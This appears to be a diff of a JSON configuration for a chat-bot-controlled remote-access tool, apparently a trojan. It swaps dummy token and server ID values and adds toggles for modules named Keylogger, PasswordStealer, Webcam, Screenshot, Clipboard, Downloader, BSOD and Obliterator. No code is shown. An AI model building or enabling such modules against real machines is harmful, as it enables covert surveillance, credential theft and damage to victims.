@@ -1,10 +1,21 @@
 {
   "BotData": {
-    "Token": "this is an example",
-    "GuildID": "1423123123123123123123432123123212123123321321321"
+    "Token": "Token Heredasdasd",
+    "GuildID": "213123123"
   },
   "Modules": {
-    "Module1": true,
-    "Module2": true
+    "Downloader": true,
+    "BSOD": false,
+    "Clipboard": true,
+    "AudioControlls": false,
+    "GhostWriter": false,
+    "KeyboardShortcuts": true,
+    "Keylogger": false,
+    "Obliterator": false,
+    "PasswordStealer": false,
+    "Screenshot": false,
+    "Webcam": false,
+    "WallpaperChanger": false,
+    "TTS": false
   }
 }
